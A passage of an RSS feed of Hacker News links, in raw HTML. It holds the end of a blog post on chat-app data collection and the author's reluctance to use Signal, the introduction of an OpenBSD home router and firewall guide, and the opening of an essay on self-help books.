srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=202%2C300&amp;ssl=1 202w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=202%2C300&amp;ssl=1 202w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=473%2C701&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Facebook and <strong>Messenger</strong> </h2>
<p>Facebook is a vacuumed of user data, they collect everything that they can get their hands on.</p>
<p>The Messenger app is also no different to the Facebook app. I’m not installing either of them, no matter how much Facebook mobile website tries to funnel me to installing their Messenger app.</p>
<figure><img data-attachment-id="159" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-2/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?fit=473%2C880&amp;ssl=1" data-orig-size="473,880" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?fit=161%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?fit=473%2C880&amp;ssl=1" loading="lazy" width="473" height="880" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=473%2C880&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=161%2C300&amp;ssl=1 161w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=161%2C300&amp;ssl=1 161w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=473%2C880&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<figure><img data-attachment-id="160" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-3/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?fit=473%2C784&amp;ssl=1" data-orig-size="473,784" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-3" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?fit=181%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?fit=473%2C784&amp;ssl=1" loading="lazy" width="473" height="784" src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=473%2C784&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=181%2C300&amp;ssl=1 181w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=181%2C300&amp;ssl=1 181w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=473%2C784&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>IMO</h2>
<p>IMO is also a chat app with a niche audience. Even though it’s not popular in the USA, IMO is quite popular in Southeast Asia as a platform to share adult content, like a live cam website.</p>
<p>But it too has chat capabilities just like any other chat app, and it too collects a decent amount of user data, even more than WhatsApp.</p>
<figure><img data-attachment-id="161" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-4/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?fit=473%2C842&amp;ssl=1" data-orig-size="473,842" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?fit=169%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?fit=473%2C842&amp;ssl=1" loading="lazy" width="473" height="842" src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=473%2C842&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=169%2C300&amp;ssl=1 169w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=169%2C300&amp;ssl=1 169w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=473%2C842&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Viber</h2>
<p>When it comes to my friends and relatives Viber is the second most popular chat app behind WhatsApp and Facebook Messenger.</p>
<p>Especially girls love using Viber because of the large variety of stickers, that they can select in the app.</p>
<p>Personally, I don’t like using viber, and find it too bloated. Yes, the stickers are nice, but what I need is a chat app, not a sticker app.</p>
<p>And it appears Viber is also collecting lot of data as well.</p>
<figure><img data-attachment-id="162" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-5/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?fit=473%2C896&amp;ssl=1" data-orig-size="473,896" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-5" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?fit=158%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?fit=473%2C896&amp;ssl=1" loading="lazy" width="473" height="896" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=473%2C896&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=158%2C300&amp;ssl=1 158w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=158%2C300&amp;ssl=1 158w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-5.jpg?resize=473%2C896&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<p><strong>I’m skipping Parent control app, because even though listed as a chat app it does not appear to look like a chat app.</strong></p>
<h2>Signal</h2>
<p>When it comes to chat apps, it’s unbelievable to see that Signal is basically not collecting any user data.</p>
<p>They also provide end to end encrypted chats by default.</p>
<p>The lack of collecting user data is a sign that they don’t need to sell user data as a way to make money. </p>
<p>Signal is currently depending on <a rel="noreferrer noopener" href="https://signal.org/donate" target="_blank">donations</a>, and even if they find other ways to monetize the service, as long as they are not collecting data, we can be sure that our data is not being used to monetize the service.</p>
<figure><img data-attachment-id="163" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-6/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?fit=473%2C672&amp;ssl=1" data-orig-size="473,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-6" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?fit=211%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?fit=473%2C672&amp;ssl=1" loading="lazy" width="473" height="672" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=473%2C672&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=211%2C300&amp;ssl=1 211w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=211%2C300&amp;ssl=1 211w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-6.jpg?resize=473%2C672&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>BOTIM</h2>
<p>I have not used the BOTIM and I have no idea why it’s there in the charts ahead of other chat apps like WeChat and Line.</p>
<p>Maybe BOTIM has a niche audience that I don’t know about.</p>
<figure><img data-attachment-id="164" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-7/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?fit=473%2C832&amp;ssl=1" data-orig-size="473,832" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-7" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?fit=171%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?fit=473%2C832&amp;ssl=1" loading="lazy" width="473" height="832" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=473%2C832&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=171%2C300&amp;ssl=1 171w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=171%2C300&amp;ssl=1 171w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image-7.jpg?resize=473%2C832&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Why <strong>I’</strong>n not/<strong>can’t</strong> use Signal</h2>
<p>I love to use Signal, I wish everyone can use Signal, and I wish I can use Signal, but I just can’t.</p>
<p>I have installed any tried using Signal couple of times, but whenever I install it it’s basically a ghost town. No one is using it and I can’t convince anyone else to join, because none of their friends on Signal either.</p>
<p>The network effect on WhatsApp is strong, and almost all of my non techie regular WhatsApp users will just accept the new TOS and will share their data with Facebook. They just want a chat app and that is what WhatsApp is providing.</p>
<p>Even if I install Signal, I will be the only one in my network using it. And no one will be willing to use Signal just to chat with me.</p>
<p>I will try to keep my personal messages away from WhatsApp as much as possible, but. I won’t be able to leave my WhatsApp groups. I will use iMessages whenever I’m chatting with someone with an Apple device.</p>
<h2>What we <strong>actually</strong> need</h2>
<p>What we actually need is not Signal, WhatsApp or Telegram. What we need is a protocol, just like email but for chat and apps that build on top of this protocol.</p>
<p>There are such protocols, but no major company is willing to use them for their chat apps.</p>
<p>If we have such protocol, then we will be able to switch apps with ease, without having to worry about the network effect or losing out chats just like we can do with our emails.</p>
<p>So please everyone try to invest on a protocol, not on an individual app.</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682981</guid>
            <pubDate>Fri, 08 Jan 2021 09:16:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Midnight Commander Visualized]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682923">thread link</a>) | @pro_methe5
<br/>
January 8, 2021 | https://www.visualsource.net/repo/github.com/MidnightCommander/mc | <a href="https://web.archive.org/web/*/https://www.visualsource.net/repo/github.com/MidnightCommander/mc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.visualsource.net/repo/github.com/MidnightCommander/mc</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682923</guid>
            <pubDate>Fri, 08 Jan 2021 09:05:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Where is the “average” person in each US state?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25682905">thread link</a>) | @marwahaha
<br/>
January 8, 2021 | https://marwahaha.github.io/ca-center/viewer | <a href="https://web.archive.org/web/*/https://marwahaha.github.io/ca-center/viewer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://marwahaha.github.io/ca-center/viewer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682905</guid>
            <pubDate>Fri, 08 Jan 2021 09:00:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenBSD Router Guide – Hakk.gg]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682743">thread link</a>) | @rodrigo975
<br/>
January 8, 2021 | https://hakk.gg/openbsd-router-guide | <a href="https://web.archive.org/web/*/https://hakk.gg/openbsd-router-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<div>
<p>Network segmenting firewall, DHCP, DNS with Unbound, domain blocking and much more</p>
<h2><span id="Introduction">Introduction</span></h2>
<div>
<p>In this guide we’re going to take a look at how we can use cheap and “low end” hardware to build an amazing OpenBSD router with firewalling capabilities, segmented local area networks, DNS with domain blocking, DHCP and more.</p>
<p>We will use a setup in which the router segments the local area network (LAN) into three separate networks, one for the grown-ups in the house, one for the children, and one for public facing servers, such as a private web server or mail server. We will also look at how we can use DNS to block out ads, porn, and other websites on the Internet. The OpenBSD router can also be used on small to mid-size offices.</p>
</div>
<h2 id="why-a-firewall"><span id="Why_a_firewall">Why a firewall?</span></h2>
<p>Almost no matter how you connect to the Internet from your home or office, you need a real firewall between you and the modem or router that your ISP has provided you with.</p>
<p>Very rarely do consumer-grade modems or routers get firmware updates and they are often vulnerable to&nbsp;<a href="https://en.wikipedia.org/wiki/Home_router#Security">network attacks</a>&nbsp;that turns these devices into&nbsp;<a href="https://en.wikipedia.org/wiki/Botnet">botnets</a>, such like the&nbsp;<a href="https://en.wikipedia.org/wiki/Mirai_(malware)">Mirai malware</a>. Many consumer-grade modems and routers is to blame for some of the largest&nbsp;<a href="https://en.wikipedia.org/wiki/Distributed_denial_of_service_attack">distributed denial of service (DDoS) attacks</a>.</p>
<p>A firewall between you and your ISP modem or router cannot protect your modem or router device against attacks, but it can protect your computers and devices on the inside of the network, and it can help you monitor and control the traffic that comes and goes to and from your local network.</p>
<p>Without a firewall between your local network and the ISP modem or router you could basically consider this an open door policy, like leaving the door to your house wide open, because you cannot trust the equipment from your ISP.</p>
<p>It is always a really good idea to put a real firewall between your local network and the Internet, and with OpenBSD you get an very solid solution.</p>
<h2 id="the-hardware"><span id="The_hardware">The hardware</span></h2>
<p>You don’t have to buy expensive hardware to get an effective router and firewall for your house or office. Even with cheap and “low end” hardware you can get a very solid solution.</p>
<p>I have build multiple solutions with the&nbsp;<a href="https://www.asrock.com/mb/Intel/Q1900DC-ITX/">ASRock Q1900DC-ITX</a>&nbsp;motherboard that comes with an Intel Quad-Core Celeron processor.</p>
<p><img src="https://hakk.gg/wp-content/themes/veen/assets/images/transparent.gif" data-lazy="true" data-src="https://www.unixsheikh.com/includes/img/asrock-q1900dc-itx.png" alt="ASRock Q1900DC-ITX motherboard"></p>
<p>I’ll admit, it’s a pretty “crappy” motherboard, but it gets the job done and I have several builds that have run very solid for many years on gigabit networks with full saturation and the firewall, DNS, etc. working “overtime” and the CPU hardly breaks a sweat.</p>
<p>The ASRock Q1900DC-ITX motherboard has the advantage that it comes with a DC-In Jack that is compatible with a 9~19V power adapter, making it very power saving. Unfortunatly the ASRock Q1900DC-ITX motherboard is no longer made, but I’m just using it as an example, I have used several other cheap boards as well.</p>
<p>I have also used the ASRock Q1900-ITX (it doesn’t come with the DC-In Jack) combined with a PicoPSU.</p>
<p><img src="https://hakk.gg/wp-content/themes/veen/assets/images/transparent.gif" data-lazy="true" data-src="https://www.unixsheikh.com/includes/img/picopsu.png" alt="PicoPSU power supply"></p>
<p>You can find different brands and versions of the PicoPSU, some are better quality than others. I have two different brands, the original and a cheaper knockoff, both performs very well and they save quite a bit of power contrary to running with a normal power supply.</p>
<p>Last, I am using a cheap Intel knockoff quad port NIC found on Ebay like this one:</p>
<p><img src="https://hakk.gg/wp-content/themes/veen/assets/images/transparent.gif" data-lazy="true" data-src="https://www.unixsheikh.com/includes/img/intel-quad-nic.png" alt="Intel Quad NIC"></p>
<p>I know it is better to use quality hardware, especially on a network that you care about, but this tutorial is about how you can get away with using fairly cheep hardware and still get an extremely useful product that will continue to serve you well for many years – at least that is my experience.</p>
<p>I recommend that you look for a low power mini ITX board with hardware&nbsp;<a href="https://www.openbsd.org/amd64.html">supported by OpenBSD</a>, such as an Intel Celeron or Intel i3 processor. These boards are typically cheap, less power hungry, and they don’t take up much space. I don’t recommend using the Intel Atom CPU if you have a gigabit network as they usually choke because they can’t handle the amount of traffic, but your mileage may vary.</p>
<p>You might also need a couple of cheap gigabit switches for the segmented local network, at least if you have more than one computer you want to connect to the same LAN 🙂</p>
<h2 id="why-openbsd"><span id="Why_OpenBSD">Why OpenBSD?</span></h2>
<p>In truth, you can get a similar setup with one of the other&nbsp;<a href="https://en.wikipedia.org/wiki/Comparison_of_BSD_operating_systems">BSD flavors</a>&nbsp;or one of the many different&nbsp;<a href="https://en.wikipedia.org/wiki/Linux_distribution">Linux distribution</a>, but&nbsp;<a href="https://www.openbsd.org/">OpenBSD</a>&nbsp;is specifically very well suited and designed for this kind of task. Not only does it come with all the needed software in the base install, but it also has significantly better security and tons of improved mitigations already build-in into the operating system. I&nbsp;<a href="https://www.unixsheikh.com/articles/openbsd-is-fantastic.html">highly recommend</a>&nbsp;OpenBSD over any other operating system for this kind of task.</p>
<p>This guide is not going to show you how to install OpenBSD. If you haven’t done that before I recommend you spin up some kind of virtual machine or see if you have some unused and supported hardware laying around you can play with. OpenBSD is one of the easiest and quickest operating systems to install. Don’t be afraid of the non-gui approach, once you have tried it you will really appreciate the simplicity. Use the default settings when in doubt.</p>
<p>Before you endeavor on this journey make sure to reference the OpenBSD documentation! Not only is everything very well documented, but you will most likely find all the answers you need right there. Read the&nbsp;<a href="https://www.openbsd.org/faq/index.html">OpenBSD FAQ</a>&nbsp;and take a look at the different&nbsp;<a href="https://man.openbsd.org/">manual pages</a>&nbsp;for the software we’re going to use.</p>
<p>Another really useful place to find general information about OpenBSD is the&nbsp;<a href="https://marc.info/?l=openbsd-misc">OpenBSD mailing list archives</a>. Also make sure to stay up to date with relevant information by subscribing to the&nbsp;<a href="https://www.openbsd.org/mail.html">Announcements and security advisories</a>&nbsp;mailing list.</p>
<p>Last, but not least, please consider&nbsp;<a href="https://www.openbsd.org/donations.html">supporting OpenBSD</a>! Even if you don’t use OpenBSD on a daily basis, but perhaps make use of&nbsp;<a href="https://www.openssh.com/">OpenSSH</a>&nbsp;on Linux, then you’re really using software from the OpenBSD project. Consider making a small, but steady donation to support the further development of all the great software the OpenBSD developers make!</p>
<h2 id="the-network"><span id="The_network">The network</span></h2>
<p>A router is basically a device that regulate network traffic between two or more separate networks. The router will ensure that network traffic intended for the local network doesn’t run out into the wild on the Internet, and traffic on the Internet, that is not intended for your local network, stays on the Internet.</p>
<p><b>NOTE:</b><br>
A router is sometimes also referred to as a gateway, which generally is alright, but in truth a real gateway joins dissimilar systems, while a router joins similar networks. An example of a gateway would be a device that joins a PC network with a telecommunications network.</p>
<p>In this tutorial we’re building a router and we have 4 networks of the same type to work with. One is the Internet and the other three are the internally segmented local area networks (LANs). Some people prefer to work with virtual LANs, but in this tutorial we’re going to use the quad port NIC from the illustration above. You can achieve the same result by using multiple one port NICs if you prefer that, you just have to make sure that you have enough room and free PCI slots on the motherboard. You can also use the Ethernet port on the motherboard itself, but it depends on the driver and support for the device. I have had no problems using the Realtek PCI gigabit Ethernet controller that normally comes with many motherboards even though I recommend Intel over Realtek.</p>
<p>Of course you don’t have to segment the network into several parts if you don’t need that, and it will be very easy to change the settings from this guide, but I have decided to use this approach in order to show you how you can protect your children by segmenting their network into a separate LAN that not only gets ad and porn blocking using DNS blocking (all the segments gets that), but you can even whitelist the parts of the Internet you want them to have access to. The last part about whitelisting is difficult and generally not recommended unless your children requires only very limited access, but it is doable with some work, and the guide is going to show you one way you can do that.</p>
<p>This is an illustration of the network we’re going to setup:</p>
<pre><code>
                       Internet
                          |
                    xxx.xxx.xxx.xxx
                    ISP Modem (WAN)
                      10.24.0.23
                          |
                       OpenBSD
                      10.24.0.50
                  (router/firewall)
                          |
     -------------------------------------------
     |                    |                    |
    NIC1                 NIC2                 NIC3
192.168.1.1          192.168.2.1          192.168.3.1
LAN1 switch          LAN2 switch          LAN3 switch
     |                    |                    |
     -- 192.168.1.x       -- 192.168.2.x       -- 192.168.3.2
     |  Grown-up PC       |  Child PC1         |  Public web server
                          |
                          -- 192.168.2.x
                          |  Child PC2
</code></pre>
<p>The IP addresses that begins with 10.24.0 are whatever IP addresses your ISP router or modem gives you, it may be something very different. The IP addresses beginning with 192.168 are the IP addresses that we’re going to use in the guide for our local area network (LAN).</p>
<p>The guide does not deal with any kind of wireless connectivity. Wireless chip firmware is notoriously buggy and exploitable and I recommend you don’t use any kind of wireless connectivity, if you can do without. If you do require wireless connectivity I strongly recommend that you disable wireless access from the ISP modem or router completely (if possible), and then buy the best wireless router you can find and put it behind the firewall in an isolated segment instead. That way should your wireless device ever be compromised you can better control the outcome and limit the damage. You can further setup the wireless router such that any devices connected to it have their own IPs that pass directly through the wireless router, but at …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hakk.gg/openbsd-router-guide">https://hakk.gg/openbsd-router-guide</a></em></p>]]>
            </description>
            <link>https://hakk.gg/openbsd-router-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682743</guid>
            <pubDate>Fri, 08 Jan 2021 08:24:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Read Self-Help]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682694">thread link</a>) | @vitabenes
<br/>
January 8, 2021 | https://tjcx.me/p/how-to-read-self-help | <a href="https://web.archive.org/web/*/https://tjcx.me/p/how-to-read-self-help">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><span>I</span>t happens every time I'm in an airport: I wander into one of those cramped munchies-and-magazines stores and find myself pulled toward <em>that</em> table. You know the one. It's always in the dead-center of the store, and it's covered with giant, glossy hardcovers with bold Gladwellian titles like</p>

<ul>
<li><em><strong>Quiet</strong>: The Power of Introverts in a World That Can't Stop Talking</em></li>
<li><em><strong>The Alter Ego Effect</strong>: The Power of Secret Identities to Transform Your Life</em></li>
<li><em><strong>Super Human</strong>: The Bulletproof Plan to Age Backward and Maybe Even Live Forever</em></li>
<li><em><strong>Indistractable</strong>: How to Control Your Attention and Choose Your Life</em></li>
<li><em><strong>Loonshots</strong>: How to Nurture the Crazy Ideas That Win Wars, Cure Diseases, and Transform Industries</em></li>
<li><em><strong>The Wisdom of Failure</strong>: How to Learn the Tough Leadership Lessons Without Paying the Price</em></li>
</ul>

<p>I usually glance at this self-help altar out of the corner of my eye while feigning interest in gallon-sized packages of M&amp;Ms. I'm not one of <em>those</em> people, constantly searching for redemption in the acid-free pages of an expensive hardcover. But invariably I see a title I just can't resist, and with flushed face I start reading the jacket of some book that promises me success in business, health, or love.</p>

<p>Almost all the books on the table are in this category—self-help—and its very presence intrigues me. Popular opinion on self-help ranges from <a href="https://www.newyorker.com/magazine/2018/01/15/improving-ourselves-to-death">ridicule</a> to accusations of <a href="https://paleofuture.gizmodo.com/the-untold-story-of-napoleon-hill-the-greatest-self-he-1789385645">outright fraud</a>, yet the bestseller lists practically burst with books like Gottlieb's <a href="https://www.goodreads.com/book/show/37570546-maybe-you-should-talk-to-someone"><em>Maybe you should talk to someone</em></a> (self-help through therapy), Epstein's <a href="https://www.goodreads.com/book/show/41795733-range"><em>Range</em></a> (how generalists can outperform specialists), and Levitin's <a href="https://www.goodreads.com/book/show/46114266-successful-aging"><em>Successful Aging</em></a> (no explanation needed).</p>

<p>We're embarrassed by self-help, but we're also attracted to it. We like reading it, but we're skeptical that it works. We suspect self-help isn't useful, but <a href="https://hacktheentrepreneur.com/best-business-books/">every</a> <a href="https://www.ryrob.com/best-business-books/">serious</a> <a href="https://www.businessinsider.com/influential-business-books">list</a> of business books turns out to be comprised entirely of self-help books.</p>

